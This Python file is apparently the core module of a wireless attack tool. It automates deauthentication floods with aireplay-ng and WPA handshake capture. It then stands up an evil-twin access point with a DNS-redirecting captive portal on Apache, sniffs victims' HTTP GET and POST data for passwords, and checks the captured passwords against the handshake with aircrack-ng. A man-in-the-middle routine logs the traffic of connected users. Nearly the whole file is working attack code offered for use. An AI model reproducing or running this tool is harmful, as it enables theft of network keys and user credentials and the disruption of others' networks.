import pyudev # type: ignore
import netifaces
import subprocess
import psutil
import time
import signal
import re
import os
from scapy.all import *
from threading import Thread
import urllib.parse
import multiprocessing
import pandas
from scapy.layers.http import HTTPRequest
from colorama import init, Fore
init()
GREEN = Fore.GREEN
RED   = Fore.RED
BLUE   = Fore.BLUE
RESET = Fore.RESET


class Sources:
    def __init__(self):
        self.i = 0
        self.pass_found = 0
        self.captured = []


        

    def get_interface_menufacturer_name(self,interface):

        context = pyudev.Context()
        for device in context.list_devices(subsystem='net'):
            if device.sys_name.startswith(interface):
                try:
                    manufacturer = str(device.get('ID_VENDOR_FROM_DATABASE')) + " " + str(device.get('ID_MODEL_FROM_DATABASE'))
                    return manufacturer
                except KeyError:
                    return ""
                
    def get_ip_address(self,interface):
        try:
            addresses = netifaces.ifaddresses(interface)
            ip_address = addresses[netifaces.AF_INET][0]['addr']
            return ip_address
        except KeyError:
            print(f"{RED}[--]Interface {interface} not found or does not have an IPv4 address.{RESET}")
            return None
    
    def get_dev_path(self,wireless_interface):
        try:
            output = subprocess.check_output(f"udevadm info /sys/class/net/{wireless_interface}", shell=True).decode()
            devpath = re.search(r'DEVPATH=(.*)', output).group(1).split("/")
            devpath.pop(-1)
            devpath = "/".join(devpath)
            return devpath
        except subprocess.CalledProcessError:
            return f"udevadm command failed for {wireless_interface}"
        except AttributeError:
            return f"Device path not found for {wireless_interface}"
        
    def get_ifindex(self, wireless_interface):
        try:
            output = subprocess.check_output(f'cat /sys/class/net/{wireless_interface}/ifindex', shell=True).decode().strip()
            return output
        except subprocess.CalledProcessError:
            return f"Interface {wireless_interface} not found or command failed"

        
    def connect_to_open_wifi(self,network_name,network_interface):
        try:
            command = ['nmcli', 'device', 'wifi', 'connect', network_name, 'ifname', network_interface]
            result = subprocess.run(command, check=True, text=True, capture_output=True)
            print(f"{BLUE}[+][+]Connected to {network_name} successfully!{RESET}")
            print(result.stdout)
        except subprocess.CalledProcessError as e:
            print(f"{RED}[--]Failed to connect to {network_name}: {e.stderr}{RESET}")
            self.connect_to_open_wifi(network_name,network_interface)
        
    def disconnect_to_open_wifi(self,network_interface):
        try:
            command = ['nmcli', 'device', 'disconnect', network_interface]
            result = subprocess.run(command, check=True, text=True, capture_output=True)
            print(f"{BLUE}[+][+]Disconnected to {network_name} successfully!{RESET}")
            print(result.stdout)
        except subprocess.CalledProcessError as e:
            print(f"{RED}[--]Failed to disconnect to {network_name}: {e.stderr}{RESET}")
    
    def change_mac(self, interface, new_mac):
        try:
            def is_valid_mac(mac):
                mac_regex = re.compile(r"^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$")
                return bool(mac_regex.match(mac))
            if is_valid_mac(new_mac):
                print(f"\n{GREEN}[!] Changing Mac Address......{RESET}")
                result = subprocess.run("systemctl stop NetworkManager", shell=True, capture_output=True, text=True)
                result = subprocess.run("systemctl stop wpa_supplicant", shell=True, capture_output=True, text=True)
                result = subprocess.run(f"ifconfig {interface} down", shell=True, capture_output=True, text=True)
                result = subprocess.run(f"ifconfig {interface} hw ether {new_mac}",shell=True, capture_output=True, text=True)
                if "SIOCSIFHWADDR: Cannot assign requested address" in result.stderr:
                    print(f"{RED}[-] Cannot assign requested mac address. Try Again with different.{RESET}")
                    time.sleep(3)
                elif "SIOCSIFHWADDR: Operation not permitted" in result.stderr:
                    print(f"{RED}[-] Changing of mac address is not permitted by network interface. Changing of mac address of selected network insterface is not allowed by network interface. Use different network interface...{RESET}")
                    time.sleep(4)
                elif result.stderr != "":
                    print(f"{RED}[-] {result.stderr}{RESET}")
                    time.sleep(3)
                else:
                    print(f"{GREEN}[+] MAC address changed to{GREEN} {BLUE}{new_mac}{RESET} {GREEN}on interface{RESET} {BLUE}{interface}{RESET}")
                result = subprocess.run(f"ifconfig {interface} up", shell=True, capture_output=True, text=True)
                result = subprocess.run("systemctl start NetworkManager", shell=True, capture_output=True, text=True)
                result = subprocess.run("systemctl start wpa_supplicant", shell=True, capture_output=True, text=True)
                time.sleep(2)
            else:
                print(f"\n{RED}[-] Mac address pattern is not correct it should be like 00:11:22:33:44:55{RESET}")
                time.sleep(3)
        except subprocess.CalledProcessError as e:
            print(f"\n{RED}Try Again as Error occurred: {e}{RESET}")
            time.sleep(3)

    def listinterfaces(self):
        list_of_interfaces = []
        self.i = 0
        self.addrs = psutil.net_if_addrs()
        os.system("clear")
        print(" Network Interfaces:- ")
        for interfaces in self.addrs.keys():
            print(str(self.i) + ". " +interfaces + "   \t|\t" + self.get_interface_menufacturer_name(interfaces))
            self.i+=1
            list_of_interfaces.append(interfaces)

        return list_of_interfaces
    
    def selectadapter(self):
        list_of_interface = self.listinterfaces()
        interface_input = input(f"{GREEN}Select wireless interface by typing 0-{str(self.i-1)}: -->{RESET} ")
        try:
            wireless_interface = list_of_interface[int(interface_input)]
            print(f"\n\n{GREEN}[++]Selected interface is {wireless_interface}.{RESET}")
            return wireless_interface
        except (IndexError, ValueError) as e:
            print(f"{RED}[--] Please Select correct index number for wireless adaptor or Select Correct WIreless Adaptor...{RESET}")
            return None
    
    def copy_directory(self,frompath,topath):
        result = subprocess.run(f"cp -r {frompath} {topath}", shell=True, capture_output=True, text=True)
        print(result.stderr)

    def list_directory(self,path=""):
        command = f"ls -l {path} " + "| grep '^d' | awk '{print $9}'"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        list_of_directories = []
        n = 0
        print(f"{GREEN}[+] Following Directories are found in {path} directory.{RESET}")
        for directories in result.stdout.split("\n"):
            if directories == "":
                pass
            else:
                print(f"{GREEN}{n}.{directories}{RESET}")
                n+=1
                list_of_directories.append(directories)
        return list_of_directories
    
    def list_files(self,path=""):
        command = f"ls -p {path} | grep -v /"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        list_of_files = []
        n = 0
        print(f"{GREEN}[+] Following files are found in {path} directory.{RESET}")
        for files in result.stdout.split("\n"):
            if files == "":
                pass
            else:
                print(f"{GREEN}{n}.{files}{RESET}")
                n+=1
                list_of_files.append(files)
        return list_of_files

    def create_folder(self,name):
        result = subprocess.run(f"mkdir {name}", shell=True, capture_output=True, text=True)
        if result.stderr == "":
            print(f"{GREEN}\n[+] {name} Folder is created successfully!!!!\n{RESET}")
        else:
            print(f"{RED}[-] {result.stderr}{RESET}")

    def create_file(self,name):
        result = subprocess.run(f"touch {name}", shell=True, capture_output=True, text=True)
        if result.stderr == "":
            print(f"\n{GREEN}[+] {name} file is created successfully!!!!\n{RESET}")
        else:
            print(f"{RED}\n[-] {result.stderr}{RESET}")
    
    def checkmode(self, wireless_interface):
        try:
            output = subprocess.check_output(f'iwconfig {wireless_interface}', shell=True).decode()
            mode = re.search(r'Mode:(\w+)', output).group(1)
            return mode
        except Exception as e:
            return str(e)
        
    def change_interface_channel(self,network_interface,channel):
        print(f"{BLUE}\n[-][-] Changing Channel of deauth wireless interface to the channel of target network.{RESET}")
        result = subprocess.run(f"iwconfig {network_interface} channel {channel}", shell=True, capture_output=True, text=True)
        print(result.stderr)

    def kill_process(self,name):
        result = subprocess.run(f"killall {name}", shell=True, capture_output=True, text=True)
        print(f"{RED}[-]Killing All Process with name {name}{RESET}")
        print(result.stderr)
       
    
    def deauth(self,network_interface,bssid,packets):
        print(f"{BLUE}\n[-][-] Starting Deauthentication Attack on Target Network.{RESET}")
        try:
            result = subprocess.run(f"aireplay-ng --deauth {packets} -a {bssid}  {network_interface}", shell=True, capture_output=True, text=True)
            print(result.stderr)
        except KeyboardInterrupt:
            print(f"{RED}[-] Closing Deauth Attack........{RESET}")

    def provide_internet(self,net_interface,ap_interface):
        result = subprocess.run(f"iptables --table nat --append POSTROUTING --out-interface {net_interface} -j MASQUERADE", shell=True, capture_output=True, text=True)
        print(result.stderr)
        result = subprocess.run(f"iptables --append FORWARD --in-interface {ap_interface} -j ACCEPT", shell=True, capture_output=True, text=True)
        print(result.stderr)
        result = subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True, capture_output=True, text=True)
        print(result.stderr)

    # def get_portal_ip(self):
    #     ip_gateway = '172.217.28.'
    #     ip = 0
    #     ip_list = []
    #     while ip<256:
    #         test_ip = ip_gateway + str(ip)
    #         try:
    #             response = requests.get(f"http://{test_ip}", timeout=1)
    #             if response.status_code == 200:
    #                 ip_list.append(test_ip)
    #             else:
    #                 pass
    #         except requests.exceptions.RequestException as e:
    #             pass

    #         ip += 1

    #     return ip_list

    def select_network(self,wirelessinterface):
        target_network = {"ssid":"","bssid":"","channel":"","encryption":""}
        networks_info = self.list_networks(wirelessinterface)
        os.system("clear")
        print("\n\n")
        network_number = 0
        for networks_names in networks_info.index:
            print(f"{BLUE}{network_number}. {networks_info.loc[networks_names,'SSID']}\t( BSSID={networks_names} , Channel={networks_info.loc[networks_names,'Channel']} , Encryption={networks_info.loc[networks_names,'Crypto']} , Signal Strenght={networks_info.loc[networks_names,'dBm_Signal']} ){RESET}")
            network_number += 1
        target = input(f" Select the target network from above list by typing index number as 0-{network_number-1} --> ")
        bssid = networks_info.index[int(target)]
        ssid = networks_info.loc[bssid,'SSID']
        channel = networks_info.loc[bssid,'Channel']
        crypto = networks_info.loc[bssid,'Crypto']
        target_network["ssid"] = ssid
        target_network["bssid"] = bssid
        target_network["channel"] = channel
        target_network["encryption"] = crypto

        print(f"{GREEN}\n Target Network:  SSID={target_network['ssid']}   BSSID={target_network['bssid']}   Channel={target_network['channel']}{RESET}\n")
        return target_network




    def list_networks(self,wireless_interface):
        scantime = input(f"\n{GREEN}[+]Select the time in second for scanning wireless networks. Recommanded: '20' ---> {RESET}")
        if scantime != "":
            scantime = int(scantime)
        else:
            scantime = 20
        if self.checkmode(wireless_interface) == "Managed":
            print(f"{RED}[--]Your wireless adapter for Listing wireless networks is in Managed mode, it should be in Monitor mode. Changing Mode to Monitor.... {RESET}")
            from changemode import ChangeMode
            ChangeMode().changetomonitormode(wireless_interface)
            networks_info = self.show_wireles_networks(wireless_interface,scantime)

        else:
            networks_info = self.show_wireles_networks(wireless_interface,scantime)
        
        return networks_info
    
            
    def show_wireles_networks(self,wirelessinterface,timeout):
        search_time = timeout
        current_time = time.time()
        networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
        networks.set_index("BSSID", inplace=True)

        def callback(packet):
            if packet.haslayer(Dot11Beacon): # type: ignore
                bssid = packet[Dot11].addr2 # type: ignore
                ssid = packet[Dot11Elt].info.decode() # type: ignore
                try:
                    dbm_signal = packet.dBm_AntSignal
                except:
                    dbm_signal = "N/A"
                stats = packet[Dot11Beacon].network_stats() # type: ignore
                channel = stats.get("channel")
                crypto = stats.get("crypto")
                networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)
    


        def print_all():
            while True:
                os.system("clear")
                print(networks)
                time.sleep(0.5)
                if time.time() > current_time+search_time:
                    break
                


        def change_channel():
            ch = 1
            while True:
                os.system(f"iwconfig {interface} channel {ch}")
                ch = ch % 14 + 1
                time.sleep(0.5)
                if time.time() > current_time+search_time:
                    break
                

        interface = wirelessinterface
        printer = Thread(target=print_all)
        printer.daemon = True
        printer.start()
        channel_changer = Thread(target=change_channel)
        channel_changer.daemon = True
        channel_changer.start()
        t = AsyncSniffer(prn=callback, iface=interface)
        t.start()
        time.sleep(search_time)
        t.stop()

        return networks
    


    def capture_get_post_request(self,interface):

        
        def process_packet(packet):
            if packet.haslayer(HTTPRequest):
                url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
                # get the requester's IP Address
                ip = packet[IP].src # type: ignore
                # get the request method
                method = packet[HTTPRequest].Method.decode()
                print(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")
                if method == "GET":
                    if "?" in str(url):
                        captured_data = str(url).split("?")
                        captured_data = captured_data[1].split("&")
                        self.captured.append(captured_data)
                        for data in captured_data:
                            data = urllib.parse.unquote(data)
                            if "+" in data:
                                data = data.replace("+"," ")
                            print(data)

                if packet.haslayer(Raw) and method == "POST":
                    # if show_raw flag is enabled, has raw data, and the requested method is "POST"
                    # then show raw
                    print(f"\n{RED}[*] Some useful Raw data: {packet[Raw].load}{RESET}")
                    captured_data = str(packet[Raw].load)[2:-1].split("&")
                    self.captured.append(captured_data)
                    for data in captured_data:
                        data = urllib.parse.unquote(data)
                        if "+" in data:
                            data = data.replace("+"," ")
                        print(data)

        def sniff_packets(iface):
            print(f"{GREEN}\n[+][+] Capturing Usernames and Passwords::::\n [-]{RESET}")
            print("\nPress 'CTRL+C' Once to restart Access Point and Capturing. Press 'CTRL+C' twice to close the attack.")
            try:
                sniff(filter="port 80", prn=process_packet, iface=iface, store=False)
            except KeyboardInterrupt:
                print(f"{RED}[-] Stoping capturing of Usernames And Password....{RESET}")


        sniff_packets(interface)
        time.sleep(1)
        os.system("clear")
        print(f"{BLUE}[+] Capturing of Usernames And Password is closed Successfully....{RESET}")

    def saving_captured(self):
        print(f"{GREEN}\n[+] Below are the captured Data for this session:::")
        print("-------------------------------------------------------------------------{RESET}")
        for data in self.captured:
            for items in data:
                items = urllib.parse.unquote(items)
                if "+" in items:
                    items = items.replace("+"," ")
                print(f"{GREEN}\t\t{items}\n{RESET}")
            print(f"{GREEN}------------------------------------------------------------------------------{RESET}")
        
        check = input("Do you want to Save capture Data into a file. 'y' for YES , 'n' for NO.").lower()
        if check == "y":
            filename = input("Provide the name for file:::: -> ")
            try:
                with open(filename, 'a') as f:
                    f.write("[+] Below are the captured Data for this session:::\n")
                    f.write("-------------------------------------------------------------------------\n")
                    for data in self.captured:
                        for items in data:
                            items = urllib.parse.unquote(items)
                            if "+" in items:
                                items = items.replace("+"," ")
                            f.write(f"\t\t{items}\n")
                        f.write("-------------------------------------------------------------------------\n")                    
                print("File " + filename + " created successfully.")
            except IOError:
                print(f"\n{RED}[--]Error: could not create file {filename}.{RESET}")

    def capturing_handshake(self,interface,network_bssid,network_channel,folderpath):
        self.change_interface_channel(interface,network_channel)
        files_name = folderpath + network_bssid
        files_list = self.list_files(folderpath)
        captured_filename = ""
        file_no = "01"
        
        self.captured_handshake = 0
        for files in files_list:
            if network_bssid in files:
                self.captured_handshake = 1
                file_no = (str(files).split("-")[1]).split(".")[0]


                

        if self.captured_handshake:
            os.system("clear")
            capture_check = input("[] Captured Handshake File already present for target network. Do you want to capture handshake again. Type 'y' to capture again or 'n' to use that file: ").lower()
            if capture_check == "y":
                def airodump_capture():
                    result = subprocess.run(f"airodump-ng --bssid {network_bssid} --channel {network_channel} -w {files_name} {interface}", shell=True, capture_output=True, text=True)
                    modified_bssid = ''.join(char.upper() if char.isalpha() else char for char in network_bssid)
                    if f"WPA handshake: {modified_bssid}" in result.stdout:
                        print(result.stdout)
                        self.captured_handshake = 1
                    else:
                        print(result.stdout)
                        self.captured_handshake = 0

                def deauth_attack():
                    try:
                        time.sleep(5)  # Give airodump-ng some time to start
                        print("Starting deauth attack to capture the handshake...")
                        self.deauth(interface,network_bssid,"25")
                        print("Deauth attack sent. Waiting to capture the handshake...")
                        time.sleep(30)  # Wait to capture the handshake
                    except FileNotFoundError:
                        print("Error: aireplay-ng or airodump-ng not found. Make sure they are installed and in your PATH.")
                    except Exception as e:
                        print(f"An error occurred: {str(e)}")
                    finally:
                        self.kill_process("airodump-ng")

                deauthattack = multiprocessing.Process(target=deauth_attack)
                deauthattack.start()
                airodump_capture()
                file_extension = f"-0{str(int(file_no)+1)}.cap"
                captured_filename = network_bssid + file_extension
            else:
                no = 0
                cap_file_list = []
                for files in files_list:
                    if network_bssid in files and ".cap" in files:
                        print(f"{no}. {files}")
                        no += 1
                        cap_file_list.append(files)
                file_select = input("[--] Following Handshake file are found for that network. Select by typing corresponding number: ---> ")
                try:
                    file_select = int(file_select)
                except ValueError:
                    file_select = 0
                captured_filename = cap_file_list[file_select]
                
            

        else:
            os.system("clear")
            def airodump_capture():
                result = subprocess.run(f"airodump-ng --bssid {network_bssid} --channel {network_channel} -w {files_name} {interface}", shell=True, capture_output=True, text=True)
                modified_bssid = ''.join(char.upper() if char.isalpha() else char for char in network_bssid)
                if f"WPA handshake: {modified_bssid}" in result.stdout:
                    print(result.stdout)
                    self.captured_handshake = 1
                else:
                    print(result.stdout)
                    self.captured_handshake = 0

            def deauth_attack():
                try:
                    time.sleep(5)  # Give airodump-ng some time to start
                    print("Starting deauth attack to capture the handshake...")
                    self.deauth(interface,network_bssid,"25")
                    print("Deauth attack sent. Waiting to capture the handshake...")
                    time.sleep(30)  # Wait to capture the handshake
                except FileNotFoundError:
                    print("Error: aireplay-ng or airodump-ng not found. Make sure they are installed and in your PATH.")
                except Exception as e:
                    print(f"An error occurred: {str(e)}")
                finally:
                    self.kill_process("airodump-ng")

            deauthattack = multiprocessing.Process(target=deauth_attack)
            deauthattack.start()
            airodump_capture()

            file_extension = f"-{file_no}.cap"
            captured_filename = network_bssid + file_extension
        
        if self.captured_handshake == 1:
            print("[+] HAndshake Captured Successfully!!!!!!! ")
            return captured_filename
        else:
            capture_again_check = input("[-] Due to some issue Handshake is not captured Successfully: Do you want to try again: 'y' or 'n' --> ").lower()
            if capture_again_check == "y":
                return self.capturing_handshake(interface,network_bssid,network_channel,folderpath)
            else:
                return ""
        
    def closing_access_point(self):
        result = subprocess.run(f"a2dismod rewrite", shell=True, capture_output=True, text=True)
        print(result.stderr)
        print(f"\n{RED}[-] Stopping Apache Serve.....{RESET}")
        result = subprocess.run(f"service apache2 stop", shell=True, capture_output=True, text=True)
        print(result.stderr)
        print(f"{RED}[-] Closing Access point and Deauth Attack.....{RESET}")
        self.kill_process("hostapd")
        self.kill_process("dnsmasq")
        self.kill_process("aireplay-ng")
    
    def access_point(self,network_interface):       
        result = subprocess.run(f"a2enmod rewrite", shell=True, capture_output=True, text=True)
        print(result.stderr)
        print(f"\n{GREEN}[+] Starting Apache Serve.....{RESET}")
        result = subprocess.run(f"service apache2 start", shell=True, capture_output=True, text=True)
        print(result.stderr)
        print(f"{GREEN}[+] Starting DNS Serve.....{RESET}")
        result = subprocess.run(f"dnsmasq -C dnsmasq.conf", shell=True, capture_output=True, text=True)
        print(result.stderr)
        print(f"{GREEN}[+] Configuring IP Range.....{RESET}")
        result = subprocess.run(f"ifconfig {network_interface} 192.168.1.1/24", shell=True, capture_output=True, text=True)
        print(result.stderr)
        print(f"{GREEN}[+] Starting Access Point .....{RESET}\n")
        os.system("hostapd hostapd.conf -B")
        time.sleep(2)

    def configue_files(self,interface,target_network,channel):
        dnsfile = "dnsmasq.conf"
        hostfile = "hostapd.conf"
        apacheconfigfile = "/etc/apache2/sites-enabled/000-default.conf"


        print(f"\n{GREEN}[+]Creating Configuration file for DNS server......{RESET}")
        try:
            with open(dnsfile, 'w') as f:
                f.write(f"interface={interface}\ndhcp-range=192.168.1.2,192.168.1.250,12h\ndhcp-option=3,192.168.1.1\ndhcp-option=6,192.168.1.1\naddress=/#/192.168.1.1")
            print(f"{GREEN}[+]File {dnsfile} created successfully.{RESET}")
        except IOError:
            print(f"{RED}[-]Error: could not create file {dnsfile}{RESET}")


        print(f"\n{GREEN}[+]Creating Configuration file for Access point......{RESET}")
        try:
            with open(hostfile, 'w') as f:
                f.write(f"interface={interface}\nssid={target_network}\nchannel={channel}\ndriver=nl80211\nhw_mode=g\nwmm_enabled=0\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0")
            print(f"{GREEN}[+]File {hostfile} created successfully.{RESET}")
        except IOError:
            print(f"{RED}[-]Error: could not create file {hostfile}.{RESET}")

        
        
        print(f"\n{GREEN}[+]Configuring Apache File for redirection .....{RESET}")
        configuration_data = '<Directory "/var/www/html">\nRewriteEngine On\nRewriteBase /\nRewriteCond %{HTTP_HOST} ^www\\.(.*)$ [NC]\nRewriteRule ^(.*)$ http://%1/$1 [R=301,L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ / [L,QSA]\n</Directory>'
        try:
            with open(apacheconfigfile, 'r') as f:
                contents = f.read()
                if configuration_data not in contents:
                    try:
                        with open(apacheconfigfile, 'a') as f:
                            f.write("\n")
                            f.write(configuration_data)
                        print(f"{GREEN}[+]Text appended to {apacheconfigfile} successfully.{RESET}")
                    except IOError:
                        print(f"{RED}[-]Error: could not append to file {apacheconfigfile}.{RESET}")
                else:
                    print(f"{GREEN}[+]Apache Configuration file is already Configured for redirection....{RESET}")
        except IOError:
            print(f"{RED}[-]Error: could not read file {apacheconfigfile}.{RESET}")


    def capture_password_and_verify(self,interface,handshake_file):

        def process_packet(packet):
            if packet.haslayer(HTTPRequest):
                url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
                ip = packet[IP].src # type: ignore
                method = packet[HTTPRequest].Method.decode()
                passwords = ""
                if method == "GET":
                    if "?" in str(url):
                        captured_data = str(url).split("?")
                        captured_data = captured_data[1].split("&")
                        for data in captured_data:
                            data = urllib.parse.unquote(data)
                            if "+" in data:
                                data = data.replace("+"," ")
                            password = data.split("=")[1]
                            print(f"[++] Captured Password = {password}")
                            passwords = passwords + password + "\n"

                if packet.haslayer(Raw) and method == "POST":
                    captured_data = str(packet[Raw].load)[2:-1].split("&")
                    for data in captured_data:
                        data = urllib.parse.unquote(data)
                        if "+" in data:
                            data = data.replace("+"," ")
                        password = data.split("=")[1]
                        print(f"[++] Captured Password = {password}")
                        passwords = passwords + password + "\n"

                if passwords != "":
                    saving_captured("passwords.txt",passwords)
                    verifing_password(handshake_file,"passwords.txt")

        def sniff_packets(iface):
            print(f"{GREEN}\n[+][+] Capturing Passwords and Verifing for network::::{RESET}")
            print("\nPress 'CTRL+C' Once to restart Access Point and Capturing. Press 'CTRL+C' twice to close the attack.")

            try:
                sniff(filter="port 80", prn=process_packet, iface=iface, store=False)
            except KeyboardInterrupt:
                print(f"{RED}[-] Stoping capturing of Usernames And Password....{RESET}")


        def saving_captured(filename,password):
            try:
                with open(filename, 'w') as f:
                    f.write(password)
            except IOError:
                print(f"\n{RED}[--]Error: could not create file {filename}.{RESET}")

        def verifing_password(handshake_file,password_file):
            print("[=] Verifying Captured Passwords using Handshake File........")
            result = subprocess.run(f"aircrack-ng {handshake_file} -w {password_file}", shell=True, capture_output=True, text=True)
            if "KEY FOUND!" in result.stdout:
                for lines in result.stdout.split("\n"):
                    if "KEY FOUND!" in lines:
                        passd = lines.split("KEY FOUND!")[1].split(" ")[2]
                                
                print("\n--------------------------------------------------------")
                print(f"[+][+] Password Found:    PASSWORD = {passd}")
                print("[++] Copy the password Before Quiting!!!!!!")
                print("--------------------------------------------------------\n")
                self.pass_found = 1
                os.kill(os.getpid(), signal.SIGINT)
            elif "KEY NOT FOUND" in result.stdout:
                print("\n--------------------------------------------------------")
                print(f"[-][-] Wrong Password:    Above Passwords are Wrong!!!")
                print("--------------------------------------------------------\n")


        sniff_packets(interface)



    def mitm_attacks(self,interface):
        def packet_sniff():
            sniff(iface = interface, store = False, prn = process_packet)
        def get_domain(ip):
            try:
                domain = socket.gethostbyaddr(ip)[0]
            except socket.herror:
                domain = "Unknown"
            return domain
        def process_packet(packet):
            if packet.haslayer(HTTPRequest):
                url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
                ip = packet[IP].src # type: ignore
                method = packet[HTTPRequest].Method.decode()
                print(f"HTTP REQUEST --> {GREEN}[+] {ip} Requested {url} with {method}{RESET}")
                if packet.haslayer(Raw) and method == "POST":
                    print(f"HTTP REQUEST IMPORTANT DATA --> {RED}[*] Some useful Raw data: {packet[Raw].load}{RESET}")
            elif Ether in packet: # type: ignore
                src_mac = packet[Ether].src # type: ignore
                dst_mac = packet[Ether].dst # type: ignore
                if IP in packet: # type: ignore
                    src_ip = packet[IP].src # type: ignore
                    dst_ip = packet[IP].dst # type: ignore
                    if DNS in packet and packet[DNS].opcode == 0 and packet[DNS].ancount == 0: # type: ignore
                        dns_query = packet[DNSQR].qname.decode('utf-8') # type: ignore
                        print(f"DNS REQUEST --> {BLUE}Source MAC:{RESET}{GREEN} {src_mac}{RESET} , {BLUE}Source IP:{RESET}{GREEN} {src_ip}{RESET}  | {BLUE}Destination MAC:{RESET}{GREEN} {dst_mac}{RESET}, {BLUE}Destination IP: {RESET}{GREEN}{dst_ip}{RESET} | {BLUE}DNS Query for:{RESET}{GREEN} {dns_query}{RESET}")
                    else:
                        print(f"HTTPS REQUEST --> {BLUE}Source MAC:{RESET}{GREEN} {src_mac}{RESET} , {BLUE}Source IP:{RESET}{GREEN} {src_ip}{RESET}  | {BLUE}Destination MAC:{RESET}{GREEN} {dst_mac}{RESET}, {BLUE}Destination IP: {RESET}{GREEN}{dst_ip}{RESET} | {BLUE}WebSite Visited:{RESET}{GREEN} {get_domain(dst_ip)}{RESET}")


        packet_sniff()

        
